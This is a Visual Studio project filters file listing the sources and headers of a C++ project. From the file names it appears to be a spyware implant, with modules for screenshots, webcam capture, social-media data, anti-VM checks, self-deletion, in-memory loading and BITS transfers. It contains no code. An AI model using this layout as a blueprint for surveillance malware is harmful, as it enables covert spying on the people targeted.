<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Source Files\Agents">
      <UniqueIdentifier>{b71355f3-c926-4fb2-983c-e2b0d6dd51c6}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Crypt">
      <UniqueIdentifier>{19c015f8-84c2-4e96-9896-c3b5d3ca4144}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Agents">
      <UniqueIdentifier>{1687ba38-960b-4957-b2c3-90be2487fa7e}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Crypt">
      <UniqueIdentifier>{ec3fa451-370e-4590-815e-2ed1bd7c080c}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\LogFiles">
      <UniqueIdentifier>{c7501101-1f2c-4dfd-ac3d-e25b7c005e00}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\LogFiles">
      <UniqueIdentifier>{ea3ff780-f810-494f-8132-d4ee4eef4478}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Proto">
      <UniqueIdentifier>{be0dd918-d024-453c-8290-1d97507413bf}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Proto">
      <UniqueIdentifier>{509d7f5a-84e3-46ae-ba91-0e60b8550c5e}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Api">
      <UniqueIdentifier>{3f94caa3-6982-4b33-9811-28fff3ef9ce0}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Api">
      <UniqueIdentifier>{02e52dbd-f37a-4f55-98a7-af232542d6c1}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\MemoryLoader">
      <UniqueIdentifier>{be49b96d-3120-4987-a0d2-9bceac9f5a07}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\MemoryLoader">
      <UniqueIdentifier>{7387265c-08f3-48cf-a150-1bead3e1a15a}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\BITS">
      <UniqueIdentifier>{9b28dbb8-61fc-4e93-bc1f-93c25c30af5f}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\BITS">
      <UniqueIdentifier>{a124e195-4fda-4c75-9106-f177d5884990}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\Agents\Social">
      <UniqueIdentifier>{1ccdd465-013d-46b6-b22a-82db3e49c332}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\Agents\Social">
      <UniqueIdentifier>{77ab4de1-b5c3-40d9-b763-78113174e01c}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="sync_thread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="win_http.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="aes_alg.cpp">
      <Filter>Source Files\Crypt</Filter>
    </ClCompile>
    <ClCompile Include="md5.cpp">
      <Filter>Source Files\Crypt</Filter>
    </ClCompile>
    <ClCompile Include="sha1.cpp">
      <Filter>Source Files\Crypt</Filter>
    </ClCompile>
    <ClCompile Include="log_files.cpp">
      <Filter>Source Files\LogFiles</Filter>
    </ClCompile>
    <ClCompile Include="proto.cpp">
      <Filter>Source Files\Proto</Filter>
    </ClCompile>
    <ClCompile Include="base64.cpp">
      <Filter>Source Files\Proto</Filter>
    </ClCompile>
    <ClCompile Include="upgrade.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="crypt.cc">
      <Filter>Source Files\Crypt</Filter>
    </ClCompile>
    <ClCompile Include="agent_device.cpp">
      <Filter>Source Files\Agents</Filter>
    </ClCompile>
    <ClCompile Include="agent_screenshot.cpp">
      <Filter>Source Files\Agents</Filter>
    </ClCompile>
    <ClCompile Include="api.cpp">
      <Filter>Source Files\Api</Filter>
    </ClCompile>
    <ClCompile Include="ldr.cpp">
      <Filter>Source Files\MemoryLoader</Filter>
    </ClCompile>
    <ClCompile Include="agent_social.cpp">
      <Filter>Source Files\Agents</Filter>
    </ClCompile>
    <ClCompile Include="agent_webcam.cpp">
      <Filter>Source Files\Agents</Filter>
    </ClCompile>
    <ClCompile Include="bits.cpp">
      <Filter>Source Files\BITS</Filter>
    </ClCompile>
    <ClCompile Include="antivm.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ComHTTP.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="autodelete_batch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="binpatched_vars.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="main.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="win_http.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="aes_alg.h">
      <Filter>Header Files\Crypt</Filter>
    </ClInclude>
    <ClInclude Include="md5.h">
      <Filter>Header Files\Crypt</Filter>
    </ClInclude>
    <ClInclude Include="sha1.h">
      <Filter>Header Files\Crypt</Filter>
    </ClInclude>
    <ClInclude Include="log_files.h">
      <Filter>Header Files\LogFiles</Filter>
    </ClInclude>
    <ClInclude Include="sync_thread.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="proto.h">
      <Filter>Header Files\Proto</Filter>
    </ClInclude>
    <ClInclude Include="base64.h">
      <Filter>Header Files\Proto</Filter>
    </ClInclude>
    <ClInclude Include="upgrade.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="crypt.h">
      <Filter>Header Files\Crypt</Filter>
    </ClInclude>
    <ClInclude Include="agent_device.h">
      <Filter>Header Files\Agents</Filter>
    </ClInclude>
    <ClInclude Include="agent_screenshot.h">
      <Filter>Header Files\Agents</Filter>
    </ClInclude>
    <ClInclude Include="api.h">
      <Filter>Header Files\Api</Filter>
    </ClInclude>
    <ClInclude Include="ldr.h">
      <Filter>Header Files\MemoryLoader</Filter>
    </ClInclude>
    <ClInclude Include="agent_social.h">
      <Filter>Header Files\Agents</Filter>
    </ClInclude>
    <ClInclude Include="qedit.h">
      <Filter>Header Files\Agents</Filter>
    </ClInclude>
    <ClInclude Include="mybits.h">
      <Filter>Header Files\BITS</Filter>
    </ClInclude>
    <ClInclude Include="utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="antivm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ComHTTP.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="version.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <None Include="exports.def">
      <Filter>Source Files</Filter>
    </None>
  </ItemGroup>
</Project>